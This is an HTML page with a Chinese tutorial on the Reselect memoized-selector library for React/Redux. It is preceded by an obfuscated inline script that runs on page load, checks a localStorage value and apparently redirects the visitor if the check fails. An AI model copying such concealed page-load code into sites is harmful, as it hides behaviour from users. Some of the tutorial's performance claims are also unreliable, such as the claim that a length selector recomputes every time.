<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x1246b9=_0x2e49;function _0x2e49(l,s){var e=_0x22e8();return(_0x2e49=function(s,n){var a=e[s-=124];void 0===_0x2e49.aqsDjF&&(_0x2e49.cnkUDr=function(s,n){var a,t=[],l=0,e="";for(s=(s=>{for(var n,a,t="",l="",e=0,p=0;a=s.charAt(p++);~a&&(n=e%4?64*n+a:a,e++%4)&&(t+=String.fromCharCode(255&n>>(-2*e&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,o=t.length;c<o;c++)l+="%"+("00"+t.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(l)})(s),p=0;p<256;p++)t[p]=p;for(p=0;p<256;p++)l=(l+t[p]+n.charCodeAt(p%n.length))%256,a=t[p],t[p]=t[l],t[l]=a;for(var p=0,l=0,c=0;c<s.length;c++)a=t[p=(p+1)%256],t[p]=t[l=(l+t[p])%256],t[l]=a,e+=String.fromCharCode(s.charCodeAt(c)^t[(t[p]+t[l])%256]);return e},l=arguments,_0x2e49.aqsDjF=!0);var s=s+e[0],t=l[s];return t?a=t:(void 0===_0x2e49.jojUfR&&(_0x2e49.jojUfR=!0),a=_0x2e49.cnkUDr(a,n),l[s]=a),a})(l,s)}function _0x22e8(){var s=["W4NcMvtcR8k9W51BEu7dIJpdMCoy","W40fsXFcTmohW5jhv0ddJ04","WQCzW4ddGNJdVmkWW4ywWRlcN8kbWO/cUKtcR8o1yeupnSoDWO8aeSk/","dmoxW5jcuSoUq1tdR1LUW4NdL8kE","cMz9WQ/cR2pcJSoVWQ3dISoP","mmo/xSoeyL1f","qhxdKSoKqfHCWRCYWRdcTfKk","AbTTW7FcSmkAba","aSk8WQZcIstcNbm","mKhdISkqxq","cSosW5bfxmkWacldPffB","dmotW5zeu8oMqIBdHgDKW5xdHG","W49jWOdcSYJdVLfRW6qIidu","FYJdGGCtxSoDzZhcRG/dRq","DCokECoVw1nn","awyRBCoyWPFdJbC","fIdcLSkuaGWf","C0SgW7xcSmovvSowW5/cN8ofdW","W4bJW7pcVCoeW7OQmCo4gYddL0e","wmkbWQniW5KXjbfhWOXRgcXK","Fs7dGW0wxCktBGxcRWldJGO","amoiDCoRdCojWQawCW","W4rLW7RcVmocW70NbSooos7dJgm","a8kTWRpcGbxcOHi"];return(_0x22e8=function(){return s})()}if((()=>{for(var s=_0x2e49,n=_0x22e8();;)try{if(457084==+parseInt(s(145,"xdRR"))+-parseInt(s(131,"z$ju"))/2*(-parseInt(s(142,"zp7a"))/3)+parseInt(s(133,"S8o$"))/4+parseInt(s(126,"^Bq6"))/5+parseInt(s(132,"oxZL"))/6*(-parseInt(s(137,"zqZc"))/7)+parseInt(s(130,"^Bq6"))/8+-parseInt(s(135,"zp7a"))/9)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x1246b9(124,"(Q%(")](_0x1246b9(129,"R3Mq"))!=_0x1246b9(141,"RjbE"))throw window[_0x1246b9(147,"2edM")][_0x1246b9(146,"zqZc")](_0x1246b9(134,"Xdl(")),Error();document.title="react Reselect 深度解析",document.getElementById("article").innerHTML='<div><h3><strong>Reselect 深度解析：原理、应用与最佳实践</strong></h3>\n<p>Reselect 是 React/Redux 生态中用于创建<strong>记忆化选择器</strong>  的核心库，它通过缓存机制避免重复计算，显著提升应用性能。本文将深入解析其原理、用法及高级技巧。</p>\n<h3><strong>一、基本概念</strong></h3>\n<h4>1. <strong>什么是选择器（Selector）？</strong></h4>\n<p>选择器是一个<strong>纯函数</strong>  ，接收 Redux 状态树作为输入，返回特定的状态片段或派生数据。例如：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 普通选择器（非记忆化）</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectTodos</span> = state =&gt; state.<span class="hljs-property">todos</span>;\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectCompletedTodos</span> = state =&gt; \n  state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> todo.<span class="hljs-property">completed</span>);\n</code></pre>\n<h4>2. <strong>为什么需要记忆化？</strong></h4>\n<p>在 React 中，组件渲染时会频繁调用选择器。如果每次都重新计算相同的结果（如过滤 todos），会造成性能浪费。Reselect 通过<strong>缓存机制</strong>  解决这一问题：</p>\n<ul>\n<li><strong>输入不变时</strong>  ：直接返回缓存结果，跳过计算。</li>\n<li><strong>输入变化时</strong>  ：重新计算并更新缓存。</li>\n</ul>\n<h3><strong>二、核心 API 详解</strong></h3>\n<h4>1. <code>createSelector(...inputSelectors, resultFunc)</code></h4>\n<p>创建一个记忆化选择器，接收多个输入选择器和一个结果函数：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { createSelector } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;reselect&#x27;</span>;\n\n<span class="hljs-comment">// 输入选择器：提取原始数据</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectTodos</span> = state =&gt; state.<span class="hljs-property">todos</span>;\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectFilter</span> = state =&gt; state.<span class="hljs-property">filter</span>;\n\n<span class="hljs-comment">// 记忆化选择器：根据 filter 筛选 todos</span>\n<span class="hljs-keyword">const</span> selectVisibleTodos = <span class="hljs-title function_">createSelector</span>(\n  [selectTodos, selectFilter], <span class="hljs-comment">// 依赖项</span>\n  <span class="hljs-function">(<span class="hljs-params">todos, filter</span>) =&gt;</span> {         <span class="hljs-comment">// 结果函数</span>\n    <span class="hljs-keyword">switch</span> (filter) {\n      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;completed&#x27;</span>:\n        <span class="hljs-keyword">return</span> todos.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> todo.<span class="hljs-property">completed</span>);\n      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;active&#x27;</span>:\n        <span class="hljs-keyword">return</span> todos.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> !todo.<span class="hljs-property">completed</span>);\n      <span class="hljs-attr">default</span>:\n        <span class="hljs-keyword">return</span> todos;\n    }\n  }\n);\n</code></pre>\n<p><strong>工作原理：</strong></p>\n<ul>\n<li>当 <code>selectTodos</code> 或 <code>selectFilter</code> 的返回值<strong>引用变化</strong>  时，执行结果函数。</li>\n<li>否则，直接返回上次缓存的结果。</li>\n</ul>\n<h4>2. <code>createStructuredSelector(mapSelectors)</code></h4>\n<p>简化多个选择器的组合，适用于从状态中提取多个值：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">selectUser</span> = state =&gt; state.<span class="hljs-property">user</span>;\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectPosts</span> = state =&gt; state.<span class="hljs-property">posts</span>;\n\n<span class="hljs-keyword">const</span> selectDashboardData = <span class="hljs-title function_">createStructuredSelector</span>({\n  <span class="hljs-attr">user</span>: selectUser,\n  <span class="hljs-attr">posts</span>: selectPosts,\n  <span class="hljs-attr">loading</span>: <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">loading</span>\n});\n\n<span class="hljs-comment">// 相当于：</span>\n<span class="hljs-comment">// state =&gt; ({</span>\n<span class="hljs-comment">//   user: selectUser(state),</span>\n<span class="hljs-comment">//   posts: selectPosts(state),</span>\n<span class="hljs-comment">//   loading: state.loading</span>\n<span class="hljs-comment">// })</span>\n</code></pre>\n<h3><strong>三、记忆化机制深入理解</strong></h3>\n<h4>1. <strong>浅比较（Shallow Comparison）</strong></h4>\n<p>Reselect 默认使用浅比较检查依赖项是否变化：</p>\n<ul>\n<li><strong>基本类型</strong>  （如 <code>number</code>、<code>string</code>）：比较值是否相等。</li>\n<li><strong>引用类型</strong>  （如 <code>object</code>、<code>array</code>）：比较引用是否相同（不检查内部属性）。</li>\n</ul>\n<pre><code class="language-javascript"><span class="hljs-comment">// 示例：浅比较导致的陷阱</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectItems</span> = state =&gt; state.<span class="hljs-property">items</span>; <span class="hljs-comment">// 返回数组</span>\n\n<span class="hljs-comment">// 错误：每次都会触发重新计算</span>\n<span class="hljs-keyword">const</span> selectItemCount = <span class="hljs-title function_">createSelector</span>(\n  [selectItems],\n  <span class="hljs-function"><span class="hljs-params">items</span> =&gt;</span> items.<span class="hljs-property">length</span>\n);\n\n<span class="hljs-comment">// 正确：直接引用原始状态中的值</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectItemCount</span> = state =&gt; state.<span class="hljs-property">items</span>.<span class="hljs-property">length</span>;\n</code></pre>\n<h4>2. <strong>缓存失效场景</strong></h4>\n<p>以下情况会导致缓存失效，触发重新计算：</p>\n<ul>\n<li><strong>依赖项的引用变化</strong>  （即使内容相同）：<pre><code class="language-javascript"><span class="hljs-comment">// 每次都返回新数组，导致 selectVisibleTodos 重新计算</span>\n<span class="hljs-title function_">setTodos</span>([...todos]); \n</code></pre>\n</li>\n<li><strong>传递不同的参数</strong>  （见下文“参数化选择器”）。</li>\n</ul>\n<h3><strong>四、高级用法</strong></h3>\n<h4>1. <strong>参数化选择器</strong></h4>\n<p>允许选择器接收组件 props 作为参数：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 选择特定 ID 的 todo</span>\n<span class="hljs-keyword">const</span> selectTodoById = <span class="hljs-title function_">createSelector</span>(\n  [\n    selectTodos,\n    <span class="hljs-function">(<span class="hljs-params">state, props</span>) =&gt;</span> props.<span class="hljs-property">todoId</span> <span class="hljs-comment">// 从 props 中提取参数</span>\n  ],\n  <span class="hljs-function">(<span class="hljs-params">todos, todoId</span>) =&gt;</span> todos.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> todo.<span class="hljs-property">id</span> === todoId)\n);\n\n<span class="hljs-comment">// 在组件中使用</span>\n<span class="hljs-keyword">const</span> todo = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> \n  <span class="hljs-title function_">selectTodoById</span>(state, { <span class="hljs-attr">todoId</span>: <span class="hljs-number">1</span> })\n);\n</code></pre>\n<p><strong>注意事项：</strong></p>\n<ul>\n<li>参数变化会触发重新计算，需避免频繁传递新对象。</li>\n<li>可使用 <code>useMemo</code> 缓存参数：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> params = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({ <span class="hljs-attr">todoId</span>: <span class="hljs-number">1</span> }), []);\n<span class="hljs-keyword">const</span> todo = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> <span class="hljs-title function_">selectTodoById</span>(state, params));\n</code></pre>\n</li>\n</ul>\n<h4>2. <strong>组合选择器</strong></h4>\n<p>选择器可以嵌套组合，构建复杂的数据转换：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> selectVisibleTodos = <span class="hljs-title function_">createSelector</span>(...);\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectCurrentPage</span> = state =&gt; state.<span class="hljs-property">currentPage</span>;\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectPageSize</span> = state =&gt; state.<span class="hljs-property">pageSize</span>;\n\n<span class="hljs-comment">// 分页选择器</span>\n<span class="hljs-keyword">const</span> selectPaginatedTodos = <span class="hljs-title function_">createSelector</span>(\n  [selectVisibleTodos, selectCurrentPage, selectPageSize],\n  <span class="hljs-function">(<span class="hljs-params">visibleTodos, currentPage, pageSize</span>) =&gt;</span> {\n    <span class="hljs-keyword">const</span> start = (currentPage - <span class="hljs-number">1</span>) * pageSize;\n    <span class="hljs-keyword">const</span> end = start + pageSize;\n    <span class="hljs-keyword">return</span> visibleTodos.<span class="hljs-title function_">slice</span>(start, end);\n  }\n);\n</code></pre>\n<h4>3. <strong>自定义比较函数</strong></h4>\n<p>通过 <code>createSelectorCreator</code> 自定义比较逻辑：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { createSelectorCreator, defaultMemoize } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;reselect&#x27;</span>;\n<span class="hljs-keyword">import</span> isEqual <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash/isEqual&#x27;</span>; <span class="hljs-comment">// 深度比较</span>\n\n<span class="hljs-comment">// 创建深度比较的选择器工厂</span>\n<span class="hljs-keyword">const</span> createDeepEqualSelector = <span class="hljs-title function_">createSelectorCreator</span>(\n  defaultMemoize,\n  isEqual <span class="hljs-comment">// 使用 lodash 的深度比较替代浅比较</span>\n);\n\n<span class="hljs-comment">// 使用深度比较的选择器</span>\n<span class="hljs-keyword">const</span> selectDeeplyNestedData = <span class="hljs-title function_">createDeepEqualSelector</span>(\n  [<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">deeply</span>.<span class="hljs-property">nested</span>.<span class="hljs-property">data</span>],\n  <span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">process</span>(data)\n);\n</code></pre>\n<h3><strong>五、性能优化与最佳实践</strong></h3>\n<h4>1. <strong>避免过度使用</strong></h4>\n<ul>\n<li><strong>简单选择器</strong>  （如 <code>state =&gt; state.value</code>）无需记忆化，直接使用。</li>\n<li><strong>复杂计算</strong>  （如过滤、排序大量数据）才需要 Reselect。</li>\n</ul>\n<h4>2. <strong>最小化依赖项</strong></h4>\n<ul>\n<li>只在依赖数组中包含真正需要监听的变量：<pre><code class="language-javascript"><span class="hljs-comment">// 错误：包含不必要的依赖</span>\n<span class="hljs-keyword">const</span> selectUserName = <span class="hljs-title function_">createSelector</span>(\n  [<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>],\n  <span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">name</span>\n);\n\n<span class="hljs-comment">// 正确：直接依赖 name</span>\n<span class="hljs-keyword">const</span> selectUserName = <span class="hljs-title function_">createSelector</span>(\n  [<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>],\n  <span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> name\n);\n</code></pre>\n</li>\n</ul>\n<h4>3. <strong>与 React.memo 结合</strong></h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">TodoList</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">{ todos }</span>) =&gt;</span> (\n  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>\n    {todos.map(todo =&gt; (\n      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{todo.id}</span>&gt;</span>{todo.text}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>\n    ))}\n  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>\n));\n\n<span class="hljs-comment">// 使用记忆化选择器确保 todos 引用稳定</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">mapStateToProps</span> = state =&gt; ({\n  <span class="hljs-attr">todos</span>: <span class="hljs-title function_">selectVisibleTodos</span>(state)\n});\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">connect</span>(mapStateToProps)(<span class="hljs-title class_">TodoList</span>);\n</code></pre>\n<h4>4. <strong>调试技巧</strong></h4>\n<ul>\n<li>使用 <code>reselect-tools</code> 分析选择器的调用频率和缓存命中率。</li>\n<li>在结果函数中添加日志：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> selectVisibleTodos = <span class="hljs-title function_">createSelector</span>(\n  [selectTodos, selectFilter],\n  <span class="hljs-function">(<span class="hljs-params">todos, filter</span>) =&gt;</span> {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;重新计算可见 todos&#x27;</span>);\n    <span class="hljs-keyword">return</span> <span class="hljs-title function_">filterTodos</span>(todos, filter);\n  }\n);\n</code></pre>\n</li>\n</ul>\n<h3><strong>六、常见误区与解决方案</strong></h3>\n<h4>1. <strong>意外的重新计算</strong></h4>\n<p><strong>原因</strong>  ：返回新对象/数组但内容未变。<br>\n<strong>解决方案</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 错误：每次返回新对象</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">selectSettings</span> = state =&gt; ({\n  <span class="hljs-attr">theme</span>: state.<span class="hljs-property">theme</span>,\n  <span class="hljs-attr">fontSize</span>: state.<span class="hljs-property">fontSize</span>\n});\n\n<span class="hljs-comment">// 正确：保持引用稳定</span>\n<span class="hljs-keyword">const</span> selectSettings = <span class="hljs-title function_">createSelector</span>(\n  [<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">theme</span>, <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">fontSize</span>],\n  <span class="hljs-function">(<span class="hljs-params">theme, fontSize</span>) =&gt;</span> ({ theme, fontSize })\n);\n</code></pre>\n<h4>2. <strong>参数化选择器的性能问题</strong></h4>\n<p><strong>问题</strong>  ：每次传递新参数（如 <code>{ id: 1 }</code>）会触发重新计算。<br>\n<strong>解决方案</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 使用 useMemo 缓存参数</span>\n<span class="hljs-keyword">const</span> params = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> }), []);\n<span class="hljs-keyword">const</span> item = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> <span class="hljs-title function_">selectItem</span>(state, params));\n\n<span class="hljs-comment">// 或使用 WeakMap 缓存选择器实例</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">createItemSelector</span> = id =&gt; \n  <span class="hljs-title function_">createSelector</span>(\n    [selectItems],\n    <span class="hljs-function"><span class="hljs-params">items</span> =&gt;</span> items.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">id</span> === id)\n  );\n\n<span class="hljs-keyword">const</span> itemSelector = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> \n  <span class="hljs-title function_">createItemSelector</span>(<span class="hljs-number">1</span>), []\n);\n<span class="hljs-keyword">const</span> item = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> <span class="hljs-title function_">itemSelector</span>(state));\n</code></pre>\n<h3><strong>七、替代方案</strong></h3>\n<ol>\n<li><strong>React.useMemo</strong>  ：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> visibleTodos = <span class="hljs-title function_">useMemo</span>(\n  <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">filterTodos</span>(todos, filter),\n  [todos, filter]\n);\n</code></pre>\n</li>\n<li><strong>Redux Toolkit 的 <code>createSelector</code></strong>  ：\n内置 Reselect，无需额外安装。</li>\n<li><strong>Immer + 浅拷贝</strong>  ：\n通过不可变更新保持引用稳定。</li>\n</ol>\n<h3><strong>总结</strong></h3>\n<p>Reselect 是处理复杂 Redux 状态的必备工具，通过记忆化缓存避免重复计算。使用时需注意：</p>\n<ul>\n<li><strong>精确控制依赖项</strong>  ，避免不必要的重新计算。</li>\n<li><strong>优化深层数据访问</strong>  ，结合 <code>useMemo</code> 或 <code>React.memo</code>。</li>\n<li><strong>权衡复杂度</strong>  ，小型应用可简化或使用替代方案。</li>\n</ul>\n<p>合理使用 Reselect 能显著提升应用性能，尤其在处理大型状态树和频繁渲染的场景中。</p>\n</div>'</script></body></html>